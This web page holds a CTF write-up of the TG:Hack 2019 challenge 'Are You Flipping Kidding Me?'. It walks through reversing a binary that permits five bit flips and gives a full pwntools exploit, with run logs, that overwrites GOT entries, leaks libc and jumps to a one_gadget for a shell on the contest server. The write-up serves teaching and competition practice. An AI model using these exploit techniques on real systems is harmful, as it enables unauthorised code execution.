@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title> TG:Hack 2019 - Are You Flipping Kidding Me? | kileak</title>
+
+
+
+
+
+<meta name="description" content="TG:Hack 2019 - Are You Flipping Kidding Me?">
+
+
+<meta name="keywords" content="TG, Hack">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2019/tghack-flippin/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<script type="text/javascript">
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-98579931-1']);
+_gaq.push(['_trackPageview']);
+
+(function() {
+  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+</script>
+
+
+<script>base_url = "";</script>
+
+        
+  </head>
+  <body class="single">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">TG:Hack 2019 - Are You Flipping Kidding Me?</h1>
+      <p class="post-meta">Apr 20, 2019</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Are You Flipping Kidding Me?
+<!--break-->
+Author: PewZ</p>
+
+  <p>Can you flip your way to a shell? nc flip.tghack.no 1947</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/tghack19/flippin/flip">flip</a> <a href="https://kileak.github.io/assets/tghack19/flippin/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/tghack19/flippin/libc.so.6">libc.so.6</a></p>
+</blockquote>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">Welcome! The current time is Sat Apr 20 14:27:29 2019
+
+I&#39;ll let you flip 5 bits, but that&#39;s it!
+Enter addr:bit to flip:</code></pre></div>
+
+<p>The binary allows us to flip 5 bits anywhere. Obviously not enough to do something useful, so we should use this “first round” to get unlimited flips.</p>
+
+<p>But first, some quick reversing of the bianry to know what we can work with</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  
+  <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I</span><span class="se">\&#39;</span><span class="s">ll let you flip 5 bits, but that</span><span class="se">\&#39;</span><span class="s">s it!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+  <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">do_flip</span><span class="p">();</span>
+    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Thank you for flipping us off!</span><span class="se">\n</span><span class="s">Have a nice day :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span></code></pre></div>
+
+<p>This looks a bit different, from what we would have expected, the “welcome” message is missing here, but <code>buf</code> gets printed.</p>
+
+<p>Something seems to be initializing <code>buf</code> before we enter main.</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">__libc_csu_init</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_2</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_3</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
+  
+  <span class="n">_init</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
+  <span class="n">lVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">__frame_dummy_init_array_entry</span><span class="p">)[</span><span class="n">lVar1</span><span class="p">])(</span><span class="n">param_1</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">,</span><span class="n">param_2</span><span class="p">,</span><span class="n">param_3</span><span class="p">);</span>
+    <span class="n">lVar1</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">lVar1</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+
+<p><code>__frame_dummy_init_array_entry</code> contains a pointer to <code>initialize</code></p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">initialize</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">undefined</span> <span class="o">*</span><span class="n">__format</span><span class="p">;</span>
+  <span class="n">tm</span> <span class="o">*</span><span class="n">__tp</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">time_str</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">time_t</span> <span class="n">_time</span><span class="p">;</span>
+
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">alarm</span><span class="p">(</span><span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+  <span class="n">__tp</span> <span class="o">=</span> <span class="n">localtime</span><span class="p">(</span><span class="o">&amp;</span><span class="n">_time</span><span class="p">);</span>
+  <span class="n">__format</span> <span class="o">=</span> <span class="n">welcome_str</span><span class="p">;</span>
+  
+  <span class="n">time_str</span> <span class="o">=</span> <span class="n">asctime</span><span class="p">(</span><span class="n">__tp</span><span class="p">);</span>
+
+  <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="n">__format</span><span class="p">,</span><span class="n">time_str</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+
+<p>This makes more sense. <code>initialize</code> will initialize <code>buf</code> with the welcome message, which then gets printed in <code>main</code>.</p>
+
+<p>Ok, after we flipped 5 bits, <code>main</code> will call <code>exit</code> to end the program, so <code>exit.got</code> would make a good target for flipping.</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">exit.got    0x400766  ==&gt; 0b10000000000011101100110
+main        0x400940  ==&gt; 0b10000000000100101000000
+_start      00400770  ==&gt; 0b10000000000011101110000</code></pre></div>
+
+<p>To flip <code>exit.got</code> to <code>main</code>, we would need 6 bit flips, which we don’t have. But we can flip <code>exit.got</code> to <code>_start</code> (only needs 3 flips), which will also get us back into <code>main</code> (though executing <code>initialize</code> again).</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">&quot;flip.tghack.no&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1947</span>
+
+<span class="k">def</span> <span class="nf">flip</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">bit</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">&quot;flip: &quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s">:</span><span class="si">%d</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">address</span><span class="p">),</span> <span class="n">bit</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Goto infinite loop&quot;</span><span class="p">)</span>
+
+    <span class="n">flip</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">&quot;exit&quot;</span><span class="p">],</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">flip</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">&quot;exit&quot;</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="n">flip</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">&quot;exit&quot;</span><span class="p">],</span> <span class="mi">4</span><span class="p">)</span>
+    <span class="n">flip</span><span class="p">(</span><span class="mh">0x601500</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>               <span class="c"># junk</span>
+    <span class="n">flip</span><span class="p">(</span><span class="mh">0x601500</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>               <span class="c"># junk</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+    
+    <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">&quot;./flip&quot;</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">&quot;./libc.so.6&quot;</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&quot;./flip&quot;</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">&quot;LD_PRELOAD&quot;</span><span class="p">:</span><span class="s">&quot;./libc.so.6&quot;</span><span class="p">})</span>
+        <span class="k">print</span> <span class="n">util</span><span class="o">.</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></div>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py
+[+] Starting local process &#39;./flip&#39;: pid 12789
+[12789]
+[*] Paused (press any to continue)
+[*] Goto infinite loop
+[*] Switching to interactive mode
+Thank you for flipping us off!
+Have a nice day :)
+Welcome! The current time is Sat Apr 20 14:43:05 2019
+
+I&#39;ll let you flip 5 bits, but that&#39;s it!
+Enter addr:bit to flip: $</code></pre></div>
+
+<p>So, we’re back in <code>main</code> and can still flip some more bits (since <code>exit.got</code> still points to <code>_start</code>, the binary will now loop infinitely.)</p>
+
+<p>Time to get some leaks…</p>
+
+<p><code>buf</code> gets filled in <code>initialize</code> via <code>sprintf</code> and the format string in <code>welcome_str</code>. If we can point <code>welcome_str</code> somewhere else, we’ll control, how <code>buf</code> is initialized. A got entry would be handy…</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">welcome_str     0x400b51  ==&gt; 0b10000000000101101010001
+setvbuf.got     0x601060  ==&gt; 0b11000000001000001100000</code></pre></div>
+
+<p>To flip <code>0x400b51</code> into <code>0x601060</code> we need 8 flips, but can only do 5 in one go. Thus we have to make sure, that <code>welcome_str</code> points to something valid after 5 flips, so <code>initialize</code> doesn’t crash…</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Overwrite welcome string for leak&quot;</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601082</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601081</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601081</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601081</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601081</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;that&#39;s it!&quot;</span><span class="p">)</span></code></pre></div>
+
+<p><code>welcome_str</code> will now point to <code>0x601051</code>, which doesn’t contain anything useful, but is a valid pointer, so we can continue…</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">flip</span><span class="p">(</span><span class="mh">0x601080</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601080</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601080</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601500</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>	<span class="c"># junk</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601500</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>	<span class="c"># junk</span>
+	
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;:)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+
+<span class="n">SETVBUF</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="p">))</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">SETVBUF</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&quot;setvbuf&quot;</span><span class="p">]</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;SETVBUF    : </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SETVBUF</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;LIBC       : </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span></code></pre></div>
+
+<p><code>welcome_str</code> now points to <code>0x601060</code>, thus <code>buf</code> gets filled with the content of <code>setvbuf.got</code>, which can be leaked now and used to calculate libc base.</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py
+[+] Starting local process &#39;./flip&#39;: pid 12887
+[12887]
+[*] Paused (press any to continue)
+[*] Goto infinite loop
+[*] Overwrite welcome string for leak
+[*] SETVBUF    : 0x7ffff7a652f0
+[*] LIBC       : 0x7ffff79e4000
+[*] Switching to interactive mode
+
+I&#39;ll let you flip 5 bits, but that&#39;s it!
+Enter addr:bit to flip: $</code></pre></div>
+
+<p>And we’re still able to flip bits. But we won’t be able to overwrite any got in one go with a useful address or gadget and every usable got entry will be called via <code>initialize</code> =&gt; <code>main</code>.</p>
+
+<p>But</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">_start      00400770  ==&gt; 0b10000000000011101110000
+main        0x400940  ==&gt; 0b10000000000100101000000</code></pre></div>
+
+<p>We can flip the <code>_start</code> pointer in <code>exit</code> to <code>main</code> in one go now (this needs exactly 5 bit flips). By doing this, the call to <code>exit</code> will then skip <code>initialize</code> and jump directly to main again. We can then flip a got, which is only used in <code>initialize</code> to something useful, and then flip <code>exit</code> back to <code>_start</code> after that. By this we have unlimited “rounds” for this.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Flip exit to main&quot;</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601068</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601068</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601069</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601069</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601069</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span></code></pre></div>
+
+<p>I overwrote <code>localtime</code> with a one gadget because the constraints were easy to fulfill.</p>
+
+<p>Since we have a libc leak, we can calculate the current value of <code>localtime.got</code> and also the target value we want to store there. We then just have to flip every bit in <code>localtime</code> which doesn’t match the one in our <code>one_gadget</code>.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Overwrite time with one gadget&quot;</span><span class="p">)</span>
+
+<span class="n">ONE</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x10a38c</span>
+<span class="n">SOURCE</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&quot;localtime&quot;</span><span class="p">]</span>  
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;ONE        : </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ONE</span><span class="p">))</span>
+
+<span class="n">ONEBIN</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">ONE</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">SOURCEBIN</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">SOURCE</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">CUROFF</span> <span class="o">=</span> <span class="mh">0x601018</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ONEBIN</span><span class="p">)):</span>
+    <span class="k">if</span> <span class="n">ONEBIN</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">SOURCEBIN</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
+        <span class="n">flip</span><span class="p">(</span><span class="n">CUROFF</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span><span class="o">/</span><span class="mi">8</span><span class="p">),</span> <span class="n">i</span><span class="o">%</span><span class="mi">8</span><span class="p">)</span>
+
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601500</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>   <span class="c"># junk</span></code></pre></div>
+
+<p>Now that we have <code>one_gadget</code> in <code>localtime</code>, we’ll just flip <code>exit</code> back again to <code>_start</code>, so <code>initialize</code> will be called again, triggering <code>one_gadget</code>, giving us a shell :)</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Flip exit to start to trigger onegadget&quot;</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601068</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601068</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601069</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601069</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">flip</span><span class="p">(</span><span class="mh">0x601069</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] &#39;/media/sf_ctf/tghack/flip/flip&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] &#39;/media/sf_ctf/tghack/flip/libc.so.6&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to flip.tghack.no on port 1947: Done
+[*] Goto infinite loop
+[*] Overwrite welcome string for leak
+[*] SETVBUF    : 0x7f86df2652f0
+[*] LIBC       : 0x7f86df1e4000
+[*] Flip exit to main
+[*] Overwrite time with one gadget
+[*] ONE        : 0x7f86df2ee38c
+[*] Flip exit to start to trigger onegadget
+[*] Switching to interactive mode
+Thank you for flipping us off!
+Have a nice day :)
+$ id
+uid=1000(tghack) gid=1000(tghack) groups=1000(tghack)
+$ ls
+flag.txt
+flip
+$ cat flag.txt
+TG19{you_think_this_is_some_kind_of_motherflippin_joke}</code></pre></div>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=TG:Hack 2019 - Are You Flipping Kidding Me?&amp;url=https://kileak.github.io/ctf/2019/tghack-flippin/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2019/tghack-flippin/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>  
+  <aside id="comments" class="disqus">    
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2019/tghack-flippin';
+        var disqus_title = 'TG:Hack 2019 - Are You Flipping Kidding Me?';
+        var disqus_url = 'https://kileak.github.io/ctf/2019/tghack-flippin';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2021 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
